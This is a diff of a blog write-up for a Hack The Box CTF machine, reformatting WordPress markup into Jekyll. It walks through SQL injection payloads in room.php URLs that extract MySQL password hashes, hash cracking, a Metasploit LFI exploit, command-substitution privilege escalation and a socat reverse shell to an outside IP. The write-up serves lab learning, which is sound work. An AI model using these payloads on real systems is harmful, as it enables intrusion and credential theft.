@@ -6,49 +6,18 @@ categories:
 toc: true
 toc_sticky: true
 ---
-## Contents
-
-[Recon](#recon)
-
-&#8212; [Port Scan](#port-scan)
-
-&#8212; [Web Directory Scan](#web-directory-scan)
-
-[Web Hacking](#web-hacking)
-
-&#8212; [Investigating PHPMYADMIN](#investigating-phpmyadmin)
-
-&#8212; [Investigating ROOM.PHP](#investigating-room-php)
-
-&#8212; [SQL Injection](#sql-injection)
-
-&#8212; [Password Cracking](#password-cracking)
-
-&#8212; [PHPMYADMIN](#phpmyadmin)
-
-[Server Side Hacking](#server-side-hacking)
-
-&#8212; [Exploitation](#exploitation)
-
-&#8212; [User Escalation](#user-escalation)
-
-&#8212; [Root Escalation](#root-escalation)
-
-## 
-
-## Recon: {#recon.ps2id}
+## Recon:
 
 <img class="alignnone wp-image-122" src="/assets/uploads/2019/08/html_cover-300x216.png" alt="" width="731" height="526" srcset="/assets/uploads/2019/08/html_cover-300x216.png 300w, /assets/uploads/2019/08/html_cover-768x554.png 768w, /assets/uploads/2019/08/html_cover.png 797w" sizes="(max-width: 731px) 100vw, 731px" /> 
 
 The website isn&#8217;t bare, but most of the links found don&#8217;t actually go anywhere. The only page with anything really going on is &#8216;Rooms&#8217;, where you&#8217;ll find the links to the rooms are PHP requests.
 
-### 
-
-### Port Scan {#port-scan.ps2id}
+### Port Scan
 
 After a thorough port-scan with Nmap you&#8217;ll notice there are the usual ports open:
 
-<pre class="lang:sh highlight:0 decode:true">PORT      STATE SERVICE REASON         VERSION
+{% highlight plain_text %}
+PORT      STATE SERVICE REASON         VERSION
 22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
 | ssh-hostkey: 
 |   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
@@ -62,23 +31,25 @@ After a thorough port-scan with Nmap you&#8217;ll notice there are the usual por
 | http-methods: 
 |_  Supported Methods: GET HEAD POST OPTIONS
 |_http-server-header: Apache/2.4.25 (Debian)
-|_http-title: Stark Hotel</pre>
+|_http-title: Stark Hotel
+{% endhighlight %}
 
 And also a high port that&#8217;s serving a webpage:
 
-<pre class="lang:zsh highlight:0 decode:true">64999/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
+{% highlight plain_text %}
+64999/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
 | http-methods: 
 |_  Supported Methods: GET HEAD POST OPTIONS
 |_http-server-header: Apache/2.4.25 (Debian)
-|_http-title: Site doesn't have a title (text/html).</pre>
+|_http-title: Site doesn't have a title (text/html).
+{% endhighlight %}
 
-### 
-
-### Web Directory Scan {#web-directory-scan.ps2id}
+### Web Directory Scan
 
 Performing a directory scan on the regular port 80 shows several folders, and PHPMyAdmin, which is interesting.
 
-<pre class="lang:zsh highlight:0 decode:true">root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u supersecurehotel.htb
+{% highlight plain_text %}
+root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u supersecurehotel.htb
 
 =====================================================
 Gobuster v2.0.0              OJ Reeves (@TheColonial)
@@ -102,21 +73,17 @@ Gobuster v2.0.0              OJ Reeves (@TheColonial)
 =====================================================
 2019/07/24 12:30:34 Finished
 =====================================================
-</pre>
+{% endhighlight %}
 
-## 
+## Web Hacking
 
-## Web Hacking {#web-hacking.ps2id}
-
-### Investigating PHPMyAdmin {#investigating-phpmyadmin.ps2id}
+### Investigating PHPMyAdmin
 
 I tried logging into the PHPMyAdmin with some low-hanging fruit credentials, but no luck there. However, it did give an error message that told my the database being used is MySQL.
 
 <img class="alignnone wp-image-141" src="/assets/uploads/2019/08/js_phpmyadmin_login-219x300.png" alt="" width="390" height="534" srcset="/assets/uploads/2019/08/js_phpmyadmin_login-219x300.png 219w, /assets/uploads/2019/08/js_phpmyadmin_login.png 437w" sizes="(max-width: 390px) 100vw, 390px" /> 
 
-### 
-
-### Investigating room.php {#investigating-room-php.ps2id}
+### Investigating room.php
 
 Looking into the source code from the site, I found only one lookup that was functional, and that&#8217;s the room.php lookup. The query could be going to a SQL statement to generate the room details.
 
@@ -129,19 +96,17 @@ http://10.10.10.143/room.php?cod=3%2527
 
 <img class="alignnone wp-image-144 size-full" src="/assets/uploads/2019/08/js_room_normal.png" alt="" width="1099" height="836" srcset="/assets/uploads/2019/08/js_room_normal.png 1099w, /assets/uploads/2019/08/js_room_normal-300x228.png 300w, /assets/uploads/2019/08/js_room_normal-768x584.png 768w, /assets/uploads/2019/08/js_room_normal-1024x779.png 1024w" sizes="(max-width: 1099px) 100vw, 1099px" /> 
 
-### 
-
-### SQL Injection {#sql-injection.ps2id}
+### SQL Injection
 
 With knowing there&#8217;s a SQL injection on the page, I went into trying some common things to leverage the vulnerability.
 
-<pre class="lang:python highlight:0 decode:true">room.php?cod=1%2527 or 1=1</pre>
+`room.php?cod=1%2527 or 1=1`
 
 That returns the first record in the table, which is the first room “1”. So either there&#8217;s a LIMIT operator, or the PHP code only selects the first result to put into the page.
 
 Also, some experimentation shows that only the first quote character needs to be double encoded, and other important characters tested are not even filtered!
 
-<pre class="lang:python highlight:0 decode:true">room.php?cod=1%2527 and ('_'='_')</pre>
+`room.php?cod=1%2527 and ('_'='_')`
 
 &#8230; this actually returns a functional result.
 
@@ -151,23 +116,23 @@ Step 1 &#8211; Figure out the shape of the table we&#8217;re working with. First
 
 I began using an ORDER BY statement and a &#8216;1&#8217; for the column count.
 
-<pre class="lang:zsh highlight:0 decode:true">room.php?cod=1%2527 order by 1</pre>
+`room.php?cod=1%2527 order by 1`
 
 Then, increment the column count until it returns an invalid response.
 
-<pre class="lang:zsh highlight:0 decode:true">room.php?cod=1%2527 order by 8</pre>
+`room.php?cod=1%2527 order by 8`
 
 Since &#8216;8&#8217; is where it breaks, that means 7 columns are good, and that&#8217;s what we need for UNIONs.
 
 Sending a UNION statement with all columns numbered will show where each piece of information goes in the result. One thing, it needs a blank page to start with, so I gave it an invalid room number.
 
-<pre class="lang:zsh highlight:0 decode:true">room.php?cod=99%2527 union select 1,2,3,4,5,6,7</pre>
+`room.php?cod=99%2527 union select 1,2,3,4,5,6,7`
 
 <img class="alignnone wp-image-145 size-full" src="/assets/uploads/2019/08/j_sqli_labels.png" alt="" width="1099" height="899" srcset="/assets/uploads/2019/08/j_sqli_labels.png 1099w, /assets/uploads/2019/08/j_sqli_labels-300x245.png 300w, /assets/uploads/2019/08/j_sqli_labels-768x628.png 768w, /assets/uploads/2019/08/j_sqli_labels-1024x838.png 1024w" sizes="(max-width: 1099px) 100vw, 1099px" /> 
 
 Step 2 &#8211; Request some basic information about the database and it&#8217;s structure.
 
-<pre class="lang:zsh highlight:0 decode:true">room.php?cod=99%2527 union select 1,@@datadir,@@basedir,database(),user(),6,7</pre>
+`room.php?cod=99%2527 union select 1,@@datadir,@@basedir,database(),user(),6,7`
 
 &nbsp;
 
@@ -177,19 +142,19 @@ Step 3 &#8211; After getting the database name &#8216;hotel&#8217;, I extracted 
 
 The below statement retrieves the table name.
 
-<pre class="lang:zsh highlight:0 decode:true">room.php?cod=99%2527 UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.columns where table_schema like 'hotel'</pre>
+`room.php?cod=99%2527 UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.columns where table_schema like 'hotel'`
 
 <img class="alignnone size-full wp-image-150" src="/assets/uploads/2019/08/js_sqli_table.png" alt="" width="291" height="330" srcset="/assets/uploads/2019/08/js_sqli_table.png 291w, /assets/uploads/2019/08/js_sqli_table-265x300.png 265w" sizes="(max-width: 291px) 100vw, 291px" /> 
 
 After that, use a statement like below to extract the columns. Increment the LIMIT operator to get the data out one at a time.
 
-<pre class="lang:zsh highlight:0 decode:true">room.php?cod=99%2527 UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns where table_name like 'room' limit 0,1</pre>
+`room.php?cod=99%2527 UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns where table_name like 'room' limit 0,1`
 
 <p class="lang:zsh highlight:0 decode:true">
   <img class="alignnone size-full wp-image-151" src="/assets/uploads/2019/08/js_sqli_column1.png" alt="" width="290" height="325" srcset="/assets/uploads/2019/08/js_sqli_column1.png 290w, /assets/uploads/2019/08/js_sqli_column1-268x300.png 268w" sizes="(max-width: 290px) 100vw, 290px" />
 </p>
 
-<pre class="lang:zsh highlight:0 decode:true">room.php?cod=99%2527 UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns where table_name like 'room' limit 1,1</pre>
+`room.php?cod=99%2527 UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns where table_name like 'room' limit 1,1`
 
 <img class="alignnone size-full wp-image-152" src="/assets/uploads/2019/08/js_sqli_column2.png" alt="" width="292" height="325" srcset="/assets/uploads/2019/08/js_sqli_column2.png 292w, /assets/uploads/2019/08/js_sqli_column2-270x300.png 270w" sizes="(max-width: 292px) 100vw, 292px" /> 
 
@@ -207,7 +172,7 @@ After going through all of the columns until the page breaks, I ended up with th
 
 This is all good info, but it didn&#8217;t get me what I wanted, which was the &#8216;user&#8217; info. The query for extracting the tables doesn&#8217;t show us any more tables besides &#8216;hotel&#8217;. I knew there had to be more, so I tried another table extraction.
 
-<pre class="lang:zsh highlight:0 decode:true">room.php?cod=99%2527 UNION SELECT ALL 1,table_name,3,4,table_name,6,7 FROM information_schema.columns where column_name like 'user' limit 0, 1</pre>
+`room.php?cod=99%2527 UNION SELECT ALL 1,table_name,3,4,table_name,6,7 FROM information_schema.columns where column_name like 'user' limit 0, 1`
 
 <img class="alignnone size-full wp-image-154" src="/assets/uploads/2019/08/js_sqli_table2.png" alt="" width="300" height="324" srcset="/assets/uploads/2019/08/js_sqli_table2.png 300w, /assets/uploads/2019/08/js_sqli_table2-278x300.png 278w" sizes="(max-width: 300px) 100vw, 300px" /> 
 
@@ -295,7 +260,7 @@ The only one with a &#8216;password&#8217; column is the table &#8216;user&#8217
 
 &nbsp;
 
-<pre class="lang:zsh highlight:0 decode:true">room.php?cod=99%2527 UNION SELECT ALL 1,table_schema,3,4,table_name,6,7 FROM information_schema.columns where table_name like 'user' limit 0,1</pre>
+`room.php?cod=99%2527 UNION SELECT ALL 1,table_schema,3,4,table_name,6,7 FROM information_schema.columns where table_name like 'user' limit 0,1`
 
 &nbsp;
 
@@ -305,13 +270,11 @@ It is &#8216;MySQL&#8217;. With that needed bit of info, a statement could be ma
 
 Step 4 &#8211; Extract the desired fields.
 
-<span class="lang:zsh highlight:0 decode:true crayon-inline">room.php?cod=99%2527 UNION SELECT ALL 1,Password,3,4,user,6,7 FROM mysql.user limit 0,1</span>
+`room.php?cod=99%2527 UNION SELECT ALL 1,Password,3,4,user,6,7 FROM mysql.user limit 0,1`
 
 <img class="alignnone size-full wp-image-157" src="/assets/uploads/2019/08/js_sqli_password.png" alt="" width="492" height="318" srcset="/assets/uploads/2019/08/js_sqli_password.png 492w, /assets/uploads/2019/08/js_sqli_password-300x194.png 300w" sizes="(max-width: 492px) 100vw, 492px" /> 
 
-### 
-
-### Password Cracking {#password-cracking.ps2id}
+### Password Cracking
 
 To crack the password, I used John the Ripper. But John needs to know what type of hash it is, so I used a program &#8216;hash-identifier&#8217; to help with that.
 
@@ -321,7 +284,7 @@ It shows a MySQL5 &#8211; SHA1 hash.
 
 Putting this into John looks like this:
 
-<span class="lang:zsh highlight:0 decode:true crayon-inline">john &#8211;wordlist=/usr/share/wordlists/rockyou.txt &#8211;format:MySQL-sha1 hashes.txt</span>
+`john &#8211;wordlist=/usr/share/wordlists/rockyou.txt &#8211;format:MySQL-sha1 hashes.txt`
 
 <img class="alignnone size-full wp-image-161" src="/assets/uploads/2019/08/js_pw_john.png" alt="" width="721" height="212" srcset="/assets/uploads/2019/08/js_pw_john.png 721w, /assets/uploads/2019/08/js_pw_john-300x88.png 300w" sizes="(max-width: 721px) 100vw, 721px" /> 
 
@@ -329,7 +292,7 @@ The password is **&#8216;imissyou&#8217;**
 
 &nbsp;
 
-### PHPMYADMIN {#phpmyadmin.ps2id}
+### PHPMYADMIN
 
 With credentials found, it was time to go back into the PHPMyAdmin page and see if they work.
 
@@ -341,11 +304,9 @@ This screenshot shows where to find the version info for PHPMyAdmin once it&#821
 
 Knowing the version, you can do a google search and find out there&#8217;s a documented local file include issue.
 
-## 
+## Server Side Hacking
 
-## Server Side Hacking {#server-side-hacking.ps2id}
-
-### Exploitation {#exploitation.ps2id}
+### Exploitation
 
 Look in Metasploit and you&#8217;ll see an exploit module for the LFI vulnerability.
 
@@ -367,11 +328,9 @@ The most probable way of getting a priv escalation to the user ‘pepper’ is t
 
 <img class="alignnone wp-image-173" src="/assets/uploads/2019/08/js_panel_linenum_sudo.png" alt="" width="718" height="148" srcset="/assets/uploads/2019/08/js_panel_linenum_sudo.png 722w, /assets/uploads/2019/08/js_panel_linenum_sudo-300x62.png 300w" sizes="(max-width: 718px) 100vw, 718px" /> 
 
-### 
+### User Escalation
 
-### User Escalation {#user-escalation.ps2id}
-
-<span class="lang:zsh highlight:0 decode:true crayon-inline">/var/www/Admin-Utilities/simpler.py</span>
+`/var/www/Admin-Utilities/simpler.py`
 
 The script can be run as sudo by &#8216;www-data&#8217;!
 
@@ -387,7 +346,7 @@ Looks like command substitution can be exploited here since the shell execution 
 
 I tried to get a shell to work through simpler.py and failed, many times. So to at least get somewhere, I extracted the user.txt with these commands:
 
-<span class="lang:zsh highlight:0 decode:true crayon-inline">sudo -u pepper ./simpler.py -p</span>  To get into the script, then <span class="lang:zsh highlight:0 decode:true crayon-inline">$(cat /home/pepper/user.txt >test.txt)</span>  inside of the script.
+`sudo -u pepper ./simpler.py -p`  To get into the script, then `$(cat /home/pepper/user.txt >test.txt)` inside of the script.
 
 To exploit systemctl for the root flag, I had to get a shell working through the simpler.py script.
 
@@ -395,25 +354,23 @@ After trying MANY things, I finally got it to work with a SOCAT shell using the 
 
 1) Set up SOCAT on my kali box with:
 
-<span class="lang:zsh highlight:0 decode:true crayon-inline">socat file:`tty`,raw,echo=0 TCP-listen:5555</span>
+`socat file:`tty`,raw,echo=0 TCP-listen:5555`
 
 2) After dropping into a shell from meterpreter:
 
-<span class="lang:zsh highlight:0 decode:true crayon-inline">sudo -u pepper /var/www/Admin-Utilities/simpler.py -p</span>
+`sudo -u pepper /var/www/Admin-Utilities/simpler.py -p`
 
 3) From within simpler.py:
 
-<span class="lang:zsh highlight:0 decode:true crayon-inline">$(bash)</span>
+`$(bash)`
 
 This allowed me to bypass the filtered characters since I need some of them. This bash shell will only allow a single command due to limitations in the injection vuln.
 
-Then set up a socat connection with <span class="lang:zsh highlight:0 decode:true crayon-inline">socat exec:&#8217;bash -li&#8217;,pty,stderr,setsid,sigint,sane tcp:10.10.15.29:5555</span>
+Then set up a socat connection with `socat exec:’bash -li’,pty,stderr,setsid,sigint,sane tcp:10.10.15.29:5555`
 
 <img class="alignnone size-full wp-image-182" src="/assets/uploads/2019/08/js_simpler_socat.png" alt="" width="720" height="108" srcset="/assets/uploads/2019/08/js_simpler_socat.png 720w, /assets/uploads/2019/08/js_simpler_socat-300x45.png 300w" sizes="(max-width: 720px) 100vw, 720px" /> 
 
-### 
-
-### Root Escalation {#root-escalation.ps2id}
+### Root Escalation
 
 Tried to use the &#8216;systemctl&#8217; command for the next escalation. My first plan was to see if a shell breakout from &#8216;less&#8217; through &#8216;systemctl status&#8217; would give me root permissions.
 
